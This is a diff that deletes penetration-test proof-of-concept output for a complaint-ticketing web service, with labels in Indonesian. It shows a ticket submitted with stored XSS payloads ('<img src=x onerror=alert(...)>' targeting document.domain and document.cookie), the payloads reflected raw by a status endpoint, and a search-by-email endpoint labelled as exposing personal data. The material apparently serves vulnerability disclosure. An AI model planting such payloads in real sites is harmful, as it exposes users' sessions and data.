@@ -1,7 +1,0 @@
-=== POC A: SUBMIT COMPLAINT DENGAN XSS PAYLOAD ===
-{"status":"success","ticket_id":"EC-18432213102026","aisa_status":{"status":"queued","message":"AISA tidak merespons. Percobaan ke-2 akan diulang 5 menit lagi (Disimpan di antrean)."}}
-=== GET_STATUS RAW REFLECTION ===
-TICKET: EC-18432213102026
-{"status":"success","data":{"tid":70,"no_tiket":"EC-18432213102026","tgl":"2026-10-13 22:43:18","nama":"Pentest PoC <img src=x onerror=alert(document.domain)>","telp":"+62812345678","email":"poc@example.com","jenis":"Masyarakat Umum","jenis_lain":null,"lingkup":"Administrasi \/ Keuangan","lingkup_lain":null,"keluhan":"POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker","pendukung":"","terms":"1","status":"Menunggu","tindak_lanjut":null}}
-=== SEARCH BY EMAIL (PII DISCLOSURE) ===
-{"status":"success","data":[{"no_tiket":"EC-18432213102026","nama":"Pentest PoC <img src=x onerror=alert(document.domain)>","tgl":"2026-10-13 22:43:18","status":"Menunggu","keluhan":"POC REPORT-1 stored XSS marker <img src=x onerror=alert(document.cookie)> end marker"}]}
